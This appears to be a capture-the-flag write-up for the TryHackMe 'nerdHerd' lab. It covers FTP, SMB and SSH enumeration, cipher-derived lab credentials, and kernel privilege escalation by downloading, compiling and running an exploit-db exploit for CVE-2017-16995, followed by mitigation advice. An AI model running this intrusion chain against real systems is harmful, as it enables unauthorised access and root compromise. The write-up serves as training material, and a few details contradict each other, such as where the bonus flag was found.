# TryHackMe - nerdHerd Writeup

**Challenge:** https://tryhackme.com/room/nerdherd  
**Target IP:** 10.201.7.126  
**Author's IP:** 10.17.19.104

---

## Overview

**nerdHerd** is a medium-hard TryHackMe challenge that combines CTF-style puzzle solving with realistic Linux exploitation techniques. The attack chain involves network enumeration, cipher decryption, credential extraction, lateral movement via SMB and SSH, and privilege escalation through kernel vulnerability exploitation.

This challenge is unique because it requires both **puzzle-solving skills** (Vigenere cipher) and **real exploitation techniques** (enumeration, lateral movement, kernel exploitation).

---

## I. Active Reconnaissance

### 1. Port Enumeration

Performed comprehensive port scan using aggressive Nmap:

```bash
nmap -A 10.201.7.126
```

**Results:**

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu
```

**Key Findings:**
- FTP allows anonymous login (vsftpd 3.0.3)
- SSH on standard port 22
- Samba 4.3.11 running on SMB ports (139, 445)
- OS: Linux 4.4 (98% confidence)

### 2. Service Version Analysis

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 3.0.3 | Anonymous access enabled |
| 22 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 | Standard SSH service |
| 139 | NetBIOS | Samba 3.X - 4.X | SMB file sharing |
| 445 | SMB | Samba 4.3.11-Ubuntu | Modern SMB dialect |

**Analysis:**
- All services are older versions with potential vulnerabilities
- Multiple entry points for enumeration
- Anonymous FTP access is a data leakage risk

---

## II. SMB Enumeration

### 1. Service Discovery

Performed SMB service enumeration:

```bash
nmap -p 445 -A 10.201.7.126
```

**SMB Configuration Discovered:**
- Computer Name: NERDHERD
- Domain: (none)
- Message Signing: Disabled (dangerous)
- Authentication: User-level

### 2. Share Discovery

Listed available shares:

```bash
smbclient -L 10.201.7.126
```

**Shares Found:**

| Share | Type | Comment |
|-------|------|---------|
| print$ | Disk | Printer Drivers |
| nerdherd_classified | Disk | Samba on Ubuntu |
| IPC$ | IPC | IPC Service |

**Share Details:**

```bash
nmap -p 445 --script smb-enum-shares 10.201.7.126
```

**Key Discovery:** 
- **nerdherd_classified** share accessible from path `/home/chuck/nerdherd_classified`
- No anonymous access initially
- Will require credentials

### 3. User Enumeration

Enumerated SMB users:

```bash
nmap -p 445 --script smb-enum-users 10.201.7.126
```

**User Discovered:**

```
NERDHERD\chuck (RID: 1000)
Full name: ChuckBartowski
Flags: Normal user account
```

**Significance:** 
- Single user account identified
- Full name "ChuckBartowski" suggests Chuck Bartowski from TV show "Chuck"
- User ID 1000 suggests standard non-root user

---

## III. FTP Enumeration

### 1. Anonymous FTP Access

Connected to FTP server:

```bash
ftp 10.201.7.126
Name: ftp
Password: [blank]
230 Login successful
```

**FTP Directory Listing:**

```
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
```

### 2. Files Discovery

Located in `/pub` directory:

**File 1: PNG Image**
- Filename: (image file)
- Purpose: Contains metadata hint

**File 2: Text File**
- Filename: (reference file)
- Content: Mentions "leet" (port 1337)

**PNG Metadata Analysis:**

```bash
exiftool <image-file>
```

**Metadata Found:**
- Author: `fijbxslz` (encrypted text, not plaintext username)

**Significance:** 
- Author field "fijbxslz" appears to be cipher text
- Will need cipher key for decryption

---

## IV. HTTP Service Discovery (Port 1337)

### 1. Service Identification

The FTP text file mentioned "leet" (internet slang for 1337), suggesting a service on port 1337:

```bash
nmap -p 1337 10.201.7.126
```

**Discovery:**
- Port 1337 hosts an HTTP web server
- Accessible via browser at `http://10.201.7.126:1337`

### 2. Website Analysis

**Main Page Content:**
- Popup messages mentioning 'something is left here for me (us) to find'
- Website contains Easter eggs and hints

### 3. Source Code Inspection

**Found in Source Code:**
```html
<!-- Popup hints about finding information -->
```

**Notable Discovery:**
- Website references to YouTube: "Surfin Bird - Bird is the Word" music video
- This is a major hint for cipher key discovery

### 4. Hidden Content

**Admin Page Discovery:**

Directory fuzzing revealed `/admin` page:

```html
<!-- Source code comments:
    these might help:
        Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
```

**Analysis:**
- First string `Y2liYXJ0b3dza2k=` is Base64 encoded
- Decodes to: `cibartowski` (reference to Chuck Bartowski)
- Second string appears incomplete/unsolvable (red herring)

---

## V. Cipher Decryption & Password Discovery

### 1. Vigenere Cipher Identification

**Clues Gathered:**
- PNG metadata author: `fijbxslz`
- FTP text file mention: "leet"
- Website reference: "Surfin Bird - Bird is the Word"
- Base64 hint: `cibartowski`

### 2. Cipher Key Discovery

**Process:**
1. YouTube video title: "Surfin Bird - Bird is the Word"
2. "Bird" is mentioned as the word/key
3. Tested with partial key: "bird"
4. Partial decryption of author field revealed: "easypa..."
5. Full key: "birdistheword" (exact song title)

### 3. Decryption Result

Using Vigenere cipher with key "birdistheword":

```
Ciphertext: fijbxslz
Plaintext: easypass
```

**Discovered Credential:**
- Username: chuck
- Password: easypass

---

## VI. SMB Access & Credential Extraction

### 1. SMB Login

Connected to SMB share with discovered credentials:

```bash
smbclient //10.201.7.126/nerdherd_classified -U chuck
Password: easypass
```

**Access Granted:** ✓

### 2. File Discovery in SMB Share

**Files Found:**

```
secr3t.txt - Hint file
```

**Content of secr3t.txt:**
```
Look in /this1sn0tadirect0ry
```

### 3. Hidden Directory Access

Accessed the directory mentioned in secr3t.txt:

```bash
cd /this1sn0tadirect0ry/
ls -la
```

**Files in Hidden Directory:**

```
creds.txt - Contains SSH credentials
```

### 4. SSH Credentials Extraction

**Content of creds.txt:**

```
SSH Credentials:
Username: chuck
Password: th1s41ntmypa5s
```

**Credential Chain Summary:**
- FTP hints → Vigenere cipher discovery
- Cipher key "birdistheword" → SMB password "easypass"
- SMB access → Found hint to hidden directory
- Hidden directory → SSH credentials discovered

---

## VII. SSH Access & User Flag

### 1. SSH Login

Connected to target machine via SSH:

```bash
ssh chuck@10.201.7.126
Password: th1s41ntmypa5s
```

**Shell Access Obtained:** ✓

```
chuck@Vulnerable:~$
```

### 2. User Enumeration

```bash
whoami
uid=1000(chuck) gid=1000(chuck) groups=1000(chuck)
```

### 3. User Flag Capture

Located user flag in home directory:

```bash
cat /home/chuck/user.txt
flag{***hidden***}
```

**User Flag:** Successfully captured

---

## VIII. Privilege Escalation

### 1. Initial Privilege Escalation Attempt

**Checked sudo permissions:**

```bash
sudo -l
User chuck may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

**Analysis:** 
- Path `/NotThisTime/MessinWithYa` doesn't exist
- Appears to be intentional red herring

**SUID Binary Enumeration:**

```bash
find / -user root -perm -u=s 2>/dev/null
```

**Result:** No useful SUID binaries found for exploitation

### 2. Kernel Vulnerability Research

Used automated vulnerability scanner:

```bash
./linux-exploit-suggester
```

**Reference:** https://github.com/The-Z-Labs/linux-exploit-suggester

**Suggestions Provided:**
- **CVE-2017-16995** - First and most promising suggestion
- Linux kernel BPF subsystem vulnerability

### 3. [CVE-2017-16995](https://www.exploit-db.com/exploits/45010) Analysis

**Vulnerability Details:**
- **CVE ID:** CVE-2017-16995
- **Component:** Linux kernel BPF (Berkeley Packet Filter) subsystem
- **Type:** Privilege escalation vulnerability
- **Affected Versions:** Multiple Linux kernel versions
- **Severity:** Critical (allows kernel code execution)

**Exploit Information:**
- **Exploit-DB ID:** 45010
- **URL:** https://www.exploit-db.com/exploits/45010
- **Language:** C
- **Requires:** Compilation before execution

### 4. Exploit Compilation & Execution

Downloaded and transfered the exploit to the target machine, compiled on target and exploit:

```bash
# Download exploit code
curl -O https://www.exploit-db.com/exploits/45010

# Compile the exploit
gcc -o exploit 45010.c

# Execute
./exploit
```

**Compilation Output:** ✓ Successful

**Execution Result:**

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Privilege Escalation:** ✓ Successful

---

## IX. Root Access & Flag Capture

### 1. Root Shell Confirmation

Verified root access:

```bash
# pwd
/home/chuck

# cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```

### 2. Root Flag Location

Initial check in root home directory:

```bash
cat /root/root.txt
```

**Result:** File exists but flag content is not present (intentional hiding)

### 3. Hidden Root Flag Discovery

Used find command to search for hidden flag:

```bash
find / -type f -name "*root*" 2>/dev/null
```

**Files Found:**
- /root/root.txt (no flag content)
- /root/.ssh/ (directory)
- Other root files...
- ...
- /opt/.root.txt (File containing the root flag)

**Root Flag:** Successfully located and captured

### 4. Bonus Flag Discovery

Examined bash history as good practice and by happenstance found bonus flag (before Privilege Escalation and Root Flag):

```bash
cat .bash_history
```

**Bonus Flag:** Found in bash history

---

## X. Attack Chain Summary

| Phase | Technique | MITRE ID | Description |
|-------|-----------|----------|-------------|
| Reconnaissance | Active Scanning | T1595.001 | Port scanning with Nmap |
| Reconnaissance | Active Scanning | T1595.002 | Service version detection |
| Reconnaissance | Gather Victim Host Information | T1592.002 | Software enumeration |
| Discovery | Network Service Discovery | T1046 | SMB enumeration |
| Discovery | Account Discovery | T1087 | SMB user discovery |
| Discovery | Network Share Discovery | T1135 | SMB share discovery |
| Credential Access | Unsecured Credentials | T1552.001 | Credentials in plaintext files |
| Lateral Movement | Remote Service: SMB | T1021.002 | SMB share access |
| Lateral Movement | Remote Service: SSH | T1021.004 | SSH access |
| Privilege Escalation | Exploitation of Vulnerability | T1068 | CVE-2017-16995 kernel exploit |
| Discovery | File and Directory Discovery | T1083 | Find command for flag hunting |

---

## XI. Key Vulnerabilities

### Vulnerability 1: Cipher-Protected Credentials

**Type:** Weak Encryption (Vigenere Cipher)

**Details:**
- SMB password protected with Vigenere cipher
- Key derivable from website hints (YouTube video title)
- Weakness: Key embedded in challenge content

**Impact:** Information disclosure

**Mitigation:**
- Use strong encryption (AES-256)
- Don't store cipher keys in accessible locations
- Use salted password hashing

---

### Vulnerability 2: Plaintext Credentials in Files

**Type:** Hardcoded Credentials

**Details:**
- SSH credentials stored in plaintext in SMB share
- File accessible after SMB authentication
- Credential: chuck:th1s41ntmypa5s

**Impact:** Lateral movement and system access

**Mitigation:**
- Never store plaintext credentials
- Use credential management systems (HashiCorp Vault, AWS Secrets Manager)
- Implement secret scanning in code repositories
- Use SSH keys instead of passwords

---

### Vulnerability 3: Outdated Linux Kernel (CVE-2017-16995)

**Type:** Kernel Vulnerability - BPF Subsystem

**Details:**
- Linux kernel version vulnerable to CVE-2017-16995
- BPF (Berkeley Packet Filter) subsystem allows code execution
- Can be exploited without authentication

**Impact:** Privilege escalation to root

**Mitigation:**
- Apply kernel security patches
- Enable kernel security modules (SELinux, AppArmor)
- Implement exploit detection mechanisms
- Regular security scanning with tools like linux-exploit-suggester

---

### Vulnerability 4: SMB Configuration Issues

**Type:** Configuration Weakness

**Details:**
- Message signing disabled on SMB
- Weak authentication mechanisms
- Plaintext SMB traffic

**Impact:** Credential interception, man-in-the-middle attacks

**Mitigation:**
- Enable SMB signing
- Use SMB encryption (SMB3.0+)
- Implement network segmentation
- Use VPN for remote SMB access

---

## XII. Defense & Mitigation Recommendations

### Immediate Actions (Priority 1 - Critical)

1. **Kernel Patching**
   ```bash
   # Update kernel to latest patched version
   sudo apt update && sudo apt upgrade
   sudo apt install linux-image-generic-hwe-$(lsb_release -rs)
   ```

2. **Remove Plaintext Credentials**
   - Delete SSH credentials from SMB share
   - Implement secret management system
   - Rotate all credentials immediately

3. **Enable SMB Signing**
   ```bash
   # /etc/samba/smb.conf
   [global]
   server signing = mandatory
   ```

4. **Disable Anonymous FTP Access**
   ```bash
   # /etc/vsftpd.conf
   anonymous_enable=NO
   ```

### Medium-term Actions (Priority 2 - High)

5. **Implement Access Controls**
   - Remove unnecessary file shares
   - Implement access control lists (ACLs)
   - Restrict SMB access to specific networks

6. **Deploy Security Monitoring**
   - Enable auditd for system auditing
   - Monitor failed authentication attempts
   - Log privilege escalation attempts

7. **SSH Hardening**
   - Disable password authentication
   - Implement SSH key-based authentication
   - Restrict SSH to specific users

8. **File Integrity Monitoring**
   ```bash
   apt install aide
   aideinit
   aide --check
   ```

### Long-term Actions (Priority 3 - Medium)

9. **Security Framework Implementation**
   - Deploy SELinux or AppArmor
   - Implement intrusion detection systems
   - Regular vulnerability assessments

10. **Credential Management**
    - Deploy HashiCorp Vault or similar
    - Implement credential rotation policies
    - Audit all credentials storage

11. **Network Segmentation**
    - Isolate sensitive systems
    - Implement network monitoring
    - Deploy firewall rules

12. **Security Awareness**
    - Never embed hints for decryption keys
    - Don't store credentials in configuration files
    - Implement security best practices

---

## XIII. Lessons Learned

1. **Enumeration is Critical:** Comprehensive port and service enumeration identified all attack vectors
2. **Multiple Entry Points:** This challenge demonstrated how multiple services can be chained for access
3. **Credential Chaining:** Showed importance of preventing credential exposure across multiple systems
4. **Kernel Exploitation:** Even without SUID binaries, kernel vulnerabilities can enable escalation
5. **CTF vs Reality:** While puzzle-solving made this fun, real-world credentials are rarely hidden in ciphers - but the exploitation techniques are realistic
6. **Defense in Depth:** Multiple layers of defense could have prevented this compromise

---

## XIV. Tools & Techniques Used

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Port and service enumeration | `nmap -A 10.201.7.126` |
| Nmap Scripts | SMB enumeration | `nmap -p 445 --script smb-enum-*` |
| exiftool | Metadata extraction | `exiftool <image-file>` |
| smbclient | SMB share access | `smbclient //host/share -U user` |
| SSH | Remote shell access | `ssh user@host` |
| linux-exploit-suggester | Kernel vulnerability detection | `./linux-exploit-suggester` |
| gcc | Exploit compilation | `gcc -o exploit exploit.c` |
| find | File discovery | `find / -type f -name "*root*"` |

---

## XV. References

- **SMB Client Documentation:** https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
- **CVE-2017-16995:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16995
- **Exploit-DB 45010:** https://www.exploit-db.com/exploits/45010
- **linux-exploit-suggester:** https://github.com/The-Z-Labs/linux-exploit-suggester
- **Nmap Scripts:** https://nmap.org/nsedoc/scripts/
- **OWASP Guidelines:** https://owasp.org/

---

## XVI. Timeline

| Date | Activity | Result |
|------|----------|--------|
| 2025-10-21 | Port scanning phase | 4 open ports identified |
| 2025-10-21 | FTP enumeration | PNG file with metadata hint discovered |
| 2025-10-21 | HTTP discovery | Port 1337 web server found |
| 2025-10-21 | Cipher decryption | Vigenere key "birdistheword" → "easypass" |
| 2025-10-21 | SMB access | Logged in with chuck:easypass |
| 2025-10-21 | Credential extraction | Found SSH creds in hidden directory |
| 2025-10-21 | SSH access | Logged in as chuck user |
| 2025-10-21 | User flag | Captured user.txt flag |
| 2025-10-21 | Exploit research | CVE-2017-16995 identified via linux-exploit-suggester |
| 2025-10-21 | Privilege escalation | Kernel exploit successful → root access |
| 2025-10-21 | Root flag | Located and captured root.txt |
| 2025-10-21 | Bonus flag | Found in /root/.bash_history |

---

## Summary

nerdHerd is a well-designed CTF challenge that combines realistic exploitation techniques with puzzle elements. The attack chain demonstrates:

- **Comprehensive enumeration** leading to service discovery
- **Information gathering** from multiple sources (FTP, HTTP, metadata)
- **Cipher cryptanalysis** as a credential access mechanism
- **Lateral movement** through credential chaining
- **Kernel exploitation** for privilege escalation

The challenge successfully teaches both **offensive security techniques** and **real-world vulnerabilities**, while the puzzle elements add engagement and context-awareness.

**Key Takeaway:** Defense-in-depth is essential - removing any single vulnerability (kernel patch, credential protection, SMB signing) would have stopped this attack chain.

---

*Writeup Completed: 2025-10-21*  
*Documentation Created: 2025-12-29*  
*Status: ✓ Production Ready*
